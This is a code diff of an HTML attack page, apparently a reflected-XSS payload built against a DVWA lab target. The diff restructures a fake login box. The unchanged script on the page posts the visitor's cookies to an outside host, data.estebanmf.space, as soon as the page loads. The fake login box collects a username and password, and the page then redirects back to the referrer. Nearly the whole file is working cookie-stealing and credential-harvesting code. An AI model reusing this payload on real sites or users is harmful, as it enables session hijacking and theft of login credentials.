@@ -8,26 +8,22 @@
 <body>
   <div id="xss-container"
     style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;">
-    <form id="c">
-      <input id="u" type="text" placeholder="Username" style="display:block;margin:10px auto;padding:5px;width:200px;"
-        required>
-      <input id="p" type="password" placeholder="Password"
-        style="display:block;margin:10px auto;padding:5px;width:200px;" required>
-      <button type="submit"
-        style="padding:5px 15px;background:#4CAF50;color:white;border:none;border-radius:4px;">Send</button>
-      <div id="msg" style="color:green;margin-top:10px;display:none;">Sent!</div>
-    </form>
+    <input id="u" type="text" placeholder="Username" style="display:block;margin:10px auto;padding:5px;width:200px;"
+      required>
+    <input id="p" type="password" placeholder="Password" style="display:block;margin:10px auto;padding:5px;width:200px;"
+      required>
+    <button id="submit-btn"
+      style="padding:5px 15px;background:#4CAF50;color:white;border:none;border-radius:4px;">Send</button>
+    <div id="msg" style="color:green;margin-top:10px;display:none;">Sent!</div>
   </div>
   <script>
-    // Initial cookie send (if needed)
     fetch('https://data.estebanmf.space/cookies', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({cookies: document.cookie})
     }).catch(e => console.error('Cookie fetch failed:', e));
 
-    document.getElementById('c').onsubmit = function (e) {
-      e.preventDefault();
+    document.getElementById('submit-btn').onclick = function () {
       let u = document.getElementById('u').value;
       let p = document.getElementById('p').value;
       if (!u || !p) {
@@ -43,7 +39,8 @@
           if (r.ok) {
             document.getElementById('msg').style.display = 'block';
             setTimeout(() => {
-              document.getElementById('c').reset();
+              document.getElementById('u').value = '';
+              document.getElementById('p').value = '';
               document.getElementById('msg').style.display = 'none';
               window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
             }, 2000);
